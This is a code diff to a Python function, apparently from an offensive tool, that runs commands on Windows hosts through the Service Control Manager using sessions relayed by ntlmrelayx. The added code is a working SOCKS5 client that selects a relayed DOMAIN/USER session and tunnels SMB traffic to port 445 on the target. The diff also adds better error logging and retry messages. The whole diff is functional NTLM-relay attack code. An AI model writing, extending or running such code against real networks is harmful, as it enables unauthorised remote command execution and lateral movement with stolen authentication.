@@ -296,6 +296,49 @@ def _scm_exec_relay(host, auth, command, cwd, timeout=120, verbose=False):
                   f'ntlmrelayx {relay_host}:{relay_port} → {ip}:445',
                   file=sys.stderr)
 
+        def _relay_connect():
+            """SOCKS5 to ntlmrelayx, supporting both no-auth and user:pass.
+
+            ntlmrelayx may require USERNAME:PASSWORD auth (method 0x02) where
+            username = DOMAIN/USER to identify which relay session to use.
+            Offer both methods so either version is handled automatically.
+            """
+            import struct as _struct
+            s = _socket.create_connection((relay_host, relay_port))
+            s.sendall(b'\x05\x02\x00\x02')   # offer no-auth + user:pass
+            resp = s.recv(2)
+            if len(resp) < 2:
+                raise RuntimeError('ntlmrelayx SOCKS closed connection during handshake')
+            if resp[1] == 0xff:
+                raise RuntimeError('ntlmrelayx SOCKS: no acceptable auth method')
+            if resp[1] == 0x02:
+                # Username:password sub-negotiation (RFC 1929)
+                # ntlmrelayx uses DOMAIN/USER as the username to pick the session.
+                user = f'{domain}/{username}'.encode()
+                pwd  = b'relay'
+                s.sendall(bytes([1, len(user)]) + user + bytes([len(pwd)]) + pwd)
+                r = s.recv(2)
+                if len(r) < 2 or r[1] != 0:
+                    raise RuntimeError(
+                        f'ntlmrelayx SOCKS user:pass auth failed for '
+                        f'{domain}/{username}: {r!r}')
+            # CONNECT request (IPv4)
+            packed_ip = _socket.inet_aton(ip)
+            req = _struct.pack('!BBBB4sH', 5, 1, 0, 1, packed_ip, 445)
+            s.sendall(req)
+            r = s.recv(4)
+            if len(r) < 4 or r[1] != 0:
+                raise RuntimeError(
+                    f'ntlmrelayx SOCKS CONNECT to {ip}:445 failed '
+                    f'(code={r[1] if len(r)>1 else "?"}): {r!r}')
+            atype = r[3]
+            if   atype == 1: s.recv(6)
+            elif atype == 3:
+                n = ord(s.recv(1))
+                s.recv(n + 2)
+            elif atype == 4: s.recv(18)
+            return s
+
         # Listener on a random local port.  Each incoming SMBConnection triggers
         # a fresh SOCKS5 tunnel to ntlmrelayx.  Because relay_host is 127.0.0.1
         # the connect goes direct — no proxychains hook required.
@@ -323,12 +366,12 @@ def _scm_exec_relay(host, auth, command, cwd, timeout=120, verbose=False):
 
         def _handle(client):
             try:
-                relay = _socks5_connect(relay_host, relay_port, ip, 445)
+                relay = _relay_connect()
                 _threading.Thread(target=_pipe, args=(relay, client),
                                    daemon=True).start()
                 _pipe(client, relay)
-            except Exception:
-                pass
+            except Exception as e:
+                print(f'  [relay-exec] forwarder: {e}', file=sys.stderr)
             finally:
                 try: client.close()
                 except Exception: pass
@@ -363,7 +406,7 @@ def _scm_exec_relay(host, auth, command, cwd, timeout=120, verbose=False):
                 break
             except Exception as e:
                 if attempt < 2:
-                    print(f'  [relay-exec] auth failed — waiting for relay session...',
+                    print(f'  [relay-exec] attempt {attempt+1} failed: {e}',
                           file=sys.stderr)
                     time.sleep(4)
                 else:
